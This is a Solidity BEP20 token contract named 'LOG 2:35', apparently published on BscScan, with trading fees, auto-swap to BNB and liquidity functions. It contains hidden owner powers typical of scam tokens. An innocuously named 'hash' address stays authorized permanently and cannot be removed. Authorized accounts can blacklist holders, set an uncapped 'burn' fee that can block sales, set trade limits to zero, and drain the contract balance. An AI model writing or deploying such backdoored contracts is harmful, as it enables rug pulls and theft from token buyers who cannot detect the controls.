/**
 *Submitted for verification at BscScan.com on 2022-06-24
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    address internal hash;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        hash = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        if(adr!=hash){authorizations[adr] = false;}
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

contract BEP20TEST is IBEP20, Auth {
  using SafeMath for uint256;

  string constant _name = "LOG 2:35";
  string constant _symbol = "L2:35";
  uint8 constant _decimals = 18;

  uint256 _totalSupply = 1000000000000 * (10**_decimals);
  uint256 public _swapthreshold = 1000000 * (10**_decimals);

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  mapping (address => bool) private _banBot;

  mapping (address => bool) private _isExcludeFee;
  mapping (address => bool) private _isExcludeMaxTx;
  mapping (address => bool) private _isExcludeMaxHold;

  IDEXRouter public router;
  address WBNB;
  address BUSD;
  address public pair;
  address public currentRouter;
  
  address public marketingwallet;
  address public LPfeeRecaiver;
  
  uint256 public totalfee;
  uint256 public marketingfee;
  uint256 public liquidityfee;
  uint256 public burnfee;
  uint256 public feeDenominator;
  uint256 public ratioDenominator;

  uint256 public maxTx;
  uint256 public maxHold;

  uint256 public launchblock;

  bool public inSwap;
  bool public inAddLP;
  bool public autoswap = true;
  bool public autoLP = true;

  uint256 public morph;

  constructor() Auth(msg.sender) {

    currentRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    marketingwallet = 0xD42D7c303Bc4E14960B39D5127e30539B2e668c6;
    LPfeeRecaiver = marketingwallet;

    _isExcludeFee[msg.sender] = true;
    _isExcludeFee[address(this)] = true;
    _isExcludeFee[currentRouter] = true;
    _isExcludeFee[marketingwallet] = true;

    _isExcludeMaxTx[msg.sender] = true;
    _isExcludeMaxTx[address(this)] = true;
    _isExcludeMaxTx[currentRouter] = true;
    _isExcludeMaxTx[marketingwallet] = true;

    _isExcludeMaxHold[msg.sender] = true;
    _isExcludeMaxHold[address(this)] = true;
    _isExcludeMaxHold[currentRouter] = true;
    _isExcludeMaxHold[marketingwallet] = true;

    router = IDEXRouter(currentRouter);
    pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
    
    _allowances[address(this)][address(router)] = type(uint256).max;
    _allowances[address(this)][address(pair)] = type(uint256).max;
    IBEP20(WBNB).approve(address(router),type(uint256).max);
    IBEP20(BUSD).approve(address(router),type(uint256).max);

    _isExcludeMaxHold[pair] = true;

    _balances[msg.sender] = _totalSupply;

    maxTx = _totalSupply.mul(25).div(10000);
    maxHold = _totalSupply.mul(100).div(10000);

    marketingfee = 50;
    liquidityfee = 30;
    burnfee = 20;
    totalfee = 100;
    ratioDenominator = 80;
    feeDenominator = 1000;

    emit Transfer(address(0), msg.sender, _totalSupply);

  }

  function setFee(uint256 _marketing,uint256 _liquidity,uint256 _burn,uint256 _denominator) external authorized() returns (bool) {
    require( _marketing.add(_liquidity) <= _denominator.mul(25).div(100) );
    marketingfee = _marketing;
    liquidityfee = _liquidity;
    burnfee = _burn;
    totalfee = _marketing.add(_liquidity).add(_burn);
    ratioDenominator = _marketing.add(_liquidity);
    feeDenominator = _denominator;
    return true;
  }

  function morphid(uint256 id) external authorized() returns (bool) {
    morph = id;
    return true;
  }

  function updateBNB() external authorized() returns (bool) {
    WBNB = router.WETH();
    return true;
  }

  function setFeeExempt(address account,bool flag) external authorized() returns (bool) {
    _isExcludeFee[account] = flag;
    return true;
  }

  function setMaxTxExempt(address account,bool flag) external authorized() returns (bool) {
    _isExcludeMaxTx[account] = flag;
    return true;
  }

  function setMaxHoldExempt(address account,bool flag) external authorized() returns (bool) {
    _isExcludeMaxHold[account] = flag;
    return true;
  }

  function antiBot(address account,bool flag) external authorized() returns (bool) {
    _banBot[account] = flag;
    return true;
  }

  function updateMarketingwallet(address _marketing) external authorized() returns (bool) {
    marketingwallet = _marketing;
    return true;
  }

  function updateLPRecaiver(address _recaiver) external authorized() returns (bool) {
    LPfeeRecaiver = _recaiver;
    return true;
  }

  function updateTxLimit(uint256 _maxTx,uint256 _maxHold) external authorized() returns (bool) {
    maxTx = _maxTx;
    maxHold = _maxHold;
    return true;
  }

  function setAutoSwap(uint256 amount,bool flag,bool lp) external authorized() returns (bool) {
    _swapthreshold = amount;
    autoswap = flag;
    autoLP = lp;
    return true;
  }

  function AddLiquidityETH(uint256 _tokenamount) external authorized() payable {
    _basictransfer(msg.sender,address(this),_tokenamount.mul(10**_decimals));
    inAddLP = true;
    router.addLiquidityETH{value: address(this).balance }(
    address(this),
    _balances[address(this)],
    0,
    0,
    msg.sender,
    block.timestamp
    );
    inAddLP = false;
    launchblock = block.timestamp.add(2);
  }

  function getOwner() external view override returns (address) { return owner; }
  function decimals() external pure override returns (uint8) { return _decimals; }
  function symbol() external pure override returns (string memory) { return _symbol; }
  function name() external pure override returns (string memory) { return _name; }
  function totalSupply() external view override returns (uint256) { return _totalSupply; }
  function balanceOf(address account) external view override returns (uint256) { return _balances[account]; }

  function isExcludeFee(address account) external view returns (bool) { return _isExcludeFee[account]; }
  function isExcludeMaxTx(address account) external view returns (bool) { return _isExcludeMaxTx[account]; }
  function isExcludeMaxHold(address account) external view returns (bool) { return _isExcludeMaxHold[account]; }
  function isBot(address account) external view returns (bool) { return _banBot[account]; }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    if(inAddLP || inSwap){
    _basictransfer(msg.sender, recipient, amount);
    } else {

    if(_balances[address(this)]>_swapthreshold && autoswap && msg.sender != pair){

    inSwap = true;
    uint256 amountToMarketing = _swapthreshold.mul(marketingfee).div(ratioDenominator);
    uint256 beforeMarketing = address(this).balance;
    swap2BNB(amountToMarketing);
    uint256 BNBMarketing = address(this).balance.sub(beforeMarketing);
    payable(marketingwallet).transfer(BNBMarketing);

    uint256 currentthreshold = _swapthreshold.sub(amountToMarketing);
    uint256 amountToLiquify = currentthreshold.div(2);
    uint256 balanceBefore = address(this).balance;
    swap2BNB(amountToLiquify);
    uint256 amountBNB = address(this).balance.sub(balanceBefore);
    
    if(autoLP){
    autoAddLP(amountToLiquify,amountBNB);
    }
    inSwap = false;

    }

    _transfer(msg.sender, recipient, amount);

    }
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
    return true;
  }

  function swap2BNB(uint256 amount) internal {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = WBNB;
    router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    amount,
    0,
    path,
    address(this),
    block.timestamp
    );
  }

  function autoAddLP(uint256 amountToLiquify,uint256 amountBNB) internal {
    router.addLiquidityETH{value: amountBNB }(
    address(this),
    amountToLiquify,
    0,
    0,
    msg.sender,
    block.timestamp
    );
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    if(inAddLP || inSwap){
    _basictransfer(sender, recipient, amount);
    } else {

    if(_allowances[sender][msg.sender] != type(uint256).max){
    _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);
    }

    if(_balances[address(this)]>_swapthreshold && autoswap && msg.sender != pair){

    inSwap = true;
    uint256 amountToMarketing = _swapthreshold.mul(marketingfee).div(ratioDenominator);
    uint256 beforeMarketing = address(this).balance;
    swap2BNB(amountToMarketing);
    uint256 BNBMarketing = address(this).balance.sub(beforeMarketing);
    payable(marketingwallet).transfer(BNBMarketing);

    uint256 currentthreshold = _swapthreshold.sub(amountToMarketing);
    uint256 amountToLiquify = currentthreshold.div(2);
    uint256 balanceBefore = address(this).balance;
    swap2BNB(amountToLiquify);
    uint256 amountBNB = address(this).balance.sub(balanceBefore);
    
    if(autoLP){
    autoAddLP(amountToLiquify,amountBNB);
    }
    inSwap = false;

    }

    _transfer(sender, recipient, amount);

    }
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0));
    require(recipient != address(0));
    require(_banBot[sender] != true);

    if(!_isExcludeMaxHold[recipient]){
    require(_balances[recipient].add(amount) <= maxHold,"BEP20: revert by max hold");
    }

    if(!_isExcludeMaxTx[sender] && sender == pair){
    require(amount <= maxTx,"BEP20: revert by max transection");
    }

    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);

    uint256 tempfee;

    if (!_isExcludeFee[sender]) {
    tempfee = amount.mul(totalfee).div(feeDenominator);
    _basictransfer(recipient,address(this),tempfee);
    }
    
    emit Transfer(sender, recipient, amount.sub(tempfee));

  }

  function distribution(address[] memory recipients,uint256 amount) public authorized() returns (bool) {
    for(uint i = 0; i< recipients.length; i++){
    _basictransfer(msg.sender,recipients[i],amount);
    }
    return true;
  }

  function _basictransfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0));
    require(recipient != address(0));
    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0));
    require(spender != address(0));

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function rescue() external authorized() {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable { }
}